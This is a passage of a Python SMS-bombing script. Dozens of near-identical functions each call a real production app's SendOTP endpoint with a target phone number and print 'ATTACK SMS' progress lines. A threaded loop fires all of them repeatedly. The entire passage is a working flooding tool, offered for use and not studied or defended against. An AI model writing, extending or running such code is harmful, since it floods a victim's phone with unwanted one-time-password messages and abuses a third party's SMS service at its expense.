	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v82] | Amount > [{i}/{num}]")

def V111():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v83] | Amount > [{i}/{num}]")

def V112():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v84] | Amount > [{i}/{num}]")

def V113():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v86] | Amount > [{i}/{num}]")

def V114():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v80] | Amount > [{i}/{num}]")

def V115():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v97] | Amount > [{i}/{num}]")

def V116():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v93] | Amount > [{i}/{num}]")

def V117():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v96] | Amount > [{i}/{num}]")

def V118():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v59] | Amount > [{i}/{num}]")

def V119():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v60] | Amount > [{i}/{num}]")

def V120():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v75] | Amount > [{i}/{num}]")

def V121():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v136] | Amount > [{i}/{num}]")

def V122():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v115] | Amount > [{i}/{num}]")

def V123():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v119] | Amount > [{i}/{num}]")

def V124():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v120] | Amount > [{i}/{num}]")
	
def V125():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v126] | Amount > [{i}/{num}]")

def V126():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v122] | Amount > [{i}/{num}]")
	
def V127():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v123] | Amount > [{i}/{num}]")

def V128():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v124] | Amount > [{i}/{num}]")
	
def V129():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v125] | Amount > [{i}/{num}]")

def V130():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v126] | Amount > [{i}/{num}]")
	
def V131():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v127] | Amount > [{i}/{num}]")

def V132():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v128] | Amount > [{i}/{num}]")
	
def V133():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v129] | Amount > [{i}/{num}]")

def V134():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v130] | Amount > [{i}/{num}]")

def V135():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v131] | Amount > [{i}/{num}]")
	
def V136():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v132] | Amount > [{i}/{num}]")

def V137():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v133] | Amount > [{i}/{num}]")

def V138():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v135] | Amount > [{i}/{num}]")

def V139():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v136] | Amount > [{i}/{num}]")

def V140():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v137] | Amount > [{i}/{num}]")

def V141():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v139] | Amount > [{i}/{num}]")

def V142():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v140] | Amount > [{i}/{num}]")

def V143():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v141] | Amount > [{i}/{num}]")

def V144():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v142] | Amount > [{i}/{num}]")

def V145():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v143] | Amount > [{i}/{num}]")

def V146():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v144] | Amount > [{i}/{num}]")

def V147():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v145] | Amount > [{i}/{num}]")

def V148():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v146] | Amount > [{i}/{num}]")

def V149():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v147] | Amount > [{i}/{num}]")

def V150():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v148] | Amount > [{i}/{num}]")

def V151():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v150] | Amount > [{i}/{num}]")

def V152():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v149] | Amount > [{i}/{num}]")

def V153():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v151] | Amount > [{i}/{num}]")

def V154():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v152] | Amount > [{i}/{num}]")

def V156():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v153] | Amount > [{i}/{num}]")

def V157():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v154] | Amount > [{i}/{num}]")
	
def V158():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v157] | Amount > [{i}/{num}]")

def V159():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v158] | Amount > [{i}/{num}]")
	
def V160():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v159] | Amount > [{i}/{num}]")

def V161():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v160] | Amount > [{i}/{num}]")

def V155():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v161] | Amount > [{i}/{num}]")
	
def V162():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v162] | Amount > [{i}/{num}]")

def V163():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v163] | Amount > [{i}/{num}]")

def V164():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v164] | Amount > [{i}/{num}]")

def V165():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v165] | Amount > [{i}/{num}]")
	
def V166():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v166] | Amount > [{i}/{num}]")

def V167():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v167] | Amount > [{i}/{num}]")

def V168():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v168] | Amount > [{i}/{num}]")

def V169():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v169] | Amount > [{i}/{num}]")
	
def V170():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v170] | Amount > [{i}/{num}]")
	
def V171():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v171] | Amount > [{i}/{num}]")

def V172():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v172] | Amount > [{i}/{num}]")

def V173():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v173] | Amount > [{i}/{num}]")

def V174():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v174] | Amount > [{i}/{num}]")

def V175():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v175] | Amount > [{i}/{num}]")
	
def V176():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v176] | Amount > [{i}/{num}]")

def V177():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v177] | Amount > [{i}/{num}]")
	
def V178():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v178] | Amount > [{i}/{num}]")

def V179():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v179] | Amount > [{i}/{num}]")

def V180():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v180] | Amount > [{i}/{num}]")


def V181():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v181] | Amount > [{i}/{num}]")

def V182():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v182] | Amount > [{i}/{num}]")

def V183():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v183] | Amount > [{i}/{num}]")
	
def V184():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v184] | Amount > [{i}/{num}]")

def V185():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v185] | Amount > [{i}/{num}]")

def V186():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v186] | Amount > [{i}/{num}]")

def V187():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v187] | Amount > [{i}/{num}]")

def V188():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v188] | Amount > [{i}/{num}]")
	
def V189():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v189] | Amount > [{i}/{num}]")

def V190():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v190] | Amount > [{i}/{num}]")

def V191():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v191] | Amount > [{i}/{num}]")

def V192():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v192] | Amount > [{i}/{num}]")

def V193():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v193] | Amount > [{i}/{num}]")

def V194():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v194] | Amount > [{i}/{num}]")

def V195():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v195] | Amount > [{i}/{num}]")
	
def V196():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v196] | Amount > [{i}/{num}]")

def V197():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v197] | Amount > [{i}/{num}]")

def V198():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v198] | Amount > [{i}/{num}]")

def V199():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v199] | Amount > [{i}/{num}]")

def V200():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v200] | Amount > [{i}/{num}]")

for i in range(num):
	time.sleep(1)
	threading.Thread(target=V1).start()
	threading.Thread(target=V2).start()
	threading.Thread(target=V3).start()
	threading.Thread(target=V4).start()
	threading.Thread(target=V5).start()
	threading.Thread(target=V6).start()
	threading.Thread(target=V7).start()
	threading.Thread(target=V8).start()
	threading.Thread(target=V9).start()
	threading.Thread(target=V10).start()
	threading.Thread(target=V11).start()
	threading.Thread(target=V12).start()
	threading.Thread(target=V14).start()
	threading.Thread(target=V15).start()
	threading.Thread(target=V16).start()
	threading.Thread(target=V17).start()
	threading.Thread(target=V18).start()
	threading.Thread(target=V19).start()
	threading.Thread(target=V20).start()
	threading.Thread(target=V21).start()
	threading.Thread(target=V22).start()
	threading.Thread(target=V24).start()
	threading.Thread(target=V25).start()
	threading.Thread(target=V26).start()
	threading.Thread(target=V27).start()
	threading.Thread(target=V28).start()
	threading.Thread(target=V29).start()
	threading.Thread(target=V30).start()
	threading.Thread(target=V31).start()
	threading.Thread(target=V32).start()
	threading.Thread(target=V33).start()
	threading.Thread(target=V34).start()
	threading.Thread(target=V35).start()
	threading.Thread(target=V36).start()
	threading.Thread(target=V37).start()
	threading.Thread(target=V38).start()
	threading.Thread(target=V39).start()
	threading.Thread(target=V40).start()
	threading.Thread(target=V41).start()
	threading.Thread(target=V42).start()
	threading.Thread(target=V43).start()
	threading.Thread(target=V44).start()
	threading.Thread(target=V45).start()
	threading.Thread(target=V46).start()
	threading.Thread(target=V47).start()
	threading.Thread(target=V48).start()
	threading.Thread(target=V49).start()
	threading.Thread(target=V50).start()
	threading.Thread(target=V51).start()
	threading.Thread(target=V52).start()
	threading.Thread(target=V53).start()
	threading.Thread(target=V54).start()
	threading.Thread(target=V55).start()
	threading.Thread(target=V56).start()
	threading.Thread(target=V57).start()
	threading.Thread(target=V58).start()
	threading.Thread(target=V59).start()
	threading.Thread(target=V60).start()
	threading.Thread(target=V61).start()
	threading.Thread(target=V62).start()
	threading.Thread(target=V63).start()
	threading.Thread(target=V64).start()
	threading.Thread(target=V65).start()
	threading.Thread(target=V66).start()
	threading.Thread(target=V67).start()
	threading.Thread(target=V68).start()
	threading.Thread(target=V69).start()
	threading.Thread(target=V70).start()
	threading.Thread(target=V71).start()
	threading.Thread(target=V72).start()
	threading.Thread(target=V73).start()
	threading.Thread(target=V74).start()
	threading.Thread(target=V75).start()
	threading.Thread(target=V76).start()
	threading.Thread(target=V77).start()
	threading.Thread(target=V78).start()
	threading.Thread(target=V79).start()
	threading.Thread(target=V80).start()
	threading.Thread(target=V81).start()
	threading.Thread(target=V82).start()
	threading.Thread(target=V83).start()
	threading.Thread(target=V84).start()
	threading.Thread(target=V85).start()
	threading.Thread(target=V86).start()
	threading.Thread(target=V87).start()
	threading.Thread(target=V88).start()
	threading.Thread(target=V89).start()
	threading.Thread(target=V90).start()
	threading.Thread(target=V91).start()
	threading.Thread(target=V92).start()
	threading.Thread(target=V93).start()
	threading.Thread(target=V94).start()
	threading.Thread(target=V95).start()
	threading.Thread(target=V96).start()
	threading.Thread(target=V97).start()
	threading.Thread(target=V98).start()
	threading.Thread(target=V99).start()
	threading.Thread(target=V100).start()
	threading.Thread(target=V101).start()
	threading.Thread(target=V102).start()
	threading.Thread(target=V103).start()
	threading.Thread(target=V104).start()
	threading.Thread(target=V105).start()
	threading.Thread(target=V106).start()
	threading.Thread(target=V107).start()
	threading.Thread(target=V108).start()
	threading.Thread(target=V109).start()
	threading.Thread(target=V110).start()
	threading.Thread(target=V111).start()
	threading.Thread(target=V112).start()
	threading.Thread(target=V113).start()
	threading.Thread(target=V114).start()
	threading.Thread(target=V115).start()
	threading.Thread(target=V116).start()
	threading.Thread(target=V117).start()
	threading.Thread(target=V118).start()
	threading.Thread(target=V119).start()
	threading.Thread(target=V120).start()
	threading.Thread(target=V121).start()
	threading.Thread(target=V122).start()
	threading.Thread(target=V123).start()
	threading.Thread(target=V124).start()
	threading.Thread(target=V125).start()
	threading.Thread(target=V126).start()
	threading.Thread(target=V127).start()
	threading.Thread(target=V128).start()
	threading.Thread(target=V129).start()
	threading.Thread(target=V130).start()
	threading.Thread(target=V131).start()
	threading.Thread(target=V132).start()
	threading.Thread(target=V133).start()
	threading.Thread(target=V134).start()
	threading.Thread(target=V135).start()
	threading.Thread(target=V136).start()
	threading.Thread(target=V137).start()
	threading.Thread(target=V138).start()
	threading.Thread(target=V139).start()
	threading.Thread(target=V140).start()
	threading.Thread(target=V141).start()
	threading.Thread(target=V142).start()
	threading.Thread(target=V143).start()
	threading.Thread(target=V144).start()
	threading.Thread(target=V145).start()
	threading.Thread(target=V146).start()
	threading.Thread(target=V147).start()
	threading.Thread(target=V148).start()
	threading.Thread(target=V149).start()
	threading.Thread(target=V150).start()
	threading.Thread(target=V151).start()
	threading.Thread(target=V152).start()
	threading.Thread(target=V153).start()
	threading.Thread(target=V154).start()
	threading.Thread(target=V155).start()
	threading.Thread(target=V156).start()
	threading.Thread(target=V157).start()
	threading.Thread(target=V158).start()
	threading.Thread(target=V159).start()
	threading.Thread(target=V160).start()
	threading.Thread(target=V161).start()
	threading.Thread(target=V162).start()
	threading.Thread(target=V163).start()
	threading.Thread(target=V164).start()
	threading.Thread(target=V165).start()
	threading.Thread(target=V166).start()
	threading.Thread(target=V167).start()
	threading.Thread(target=V168).start()
	threading.Thread(target=V169).start()
	threading.Thread(target=V170).start()
	threading.Thread(target=V171).start()
	threading.Thread(target=V172).start()
	threading.Thread(target=V173).start()
	threading.Thread(target=V174).start()
	threading.Thread(target=V175).start()
	threading.Thread(target=V176).start()
	threading.Thread(target=V177).start()
	threading.Thread(target=V178).start()
	threading.Thread(target=V179).start()
	threading.Thread(target=V180).start()
	threading.Thread(target=V181).start()
	threading.Thread(target=V182).start()
	threading.Thread(target=V183).start()
	threading.Thread(target=V184).start()
	threading.Thread(target=V185).start()
	threading.Thread(target=V186).start()
	threading.Thread(target=V187).start()
	threading.Thread(target=V188).start()
	threading.Thread(target=V189).start()
	threading.Thread(target=V190).start()
	threading.Thread(target=V191).start()
	threading.Thread(target=V192).start()
	threading.Thread(target=V193).start()
	threading.Thread(target=V194).start()
	threading.Thread(target=V195).start()
	threading.Thread(target=V196).start()
	threading.Thread(target=V197).start()
	threading.Thread(target=V198).start()
	threading.Thread(target=V199).start()
	threading.Thread(target=V200).start()
	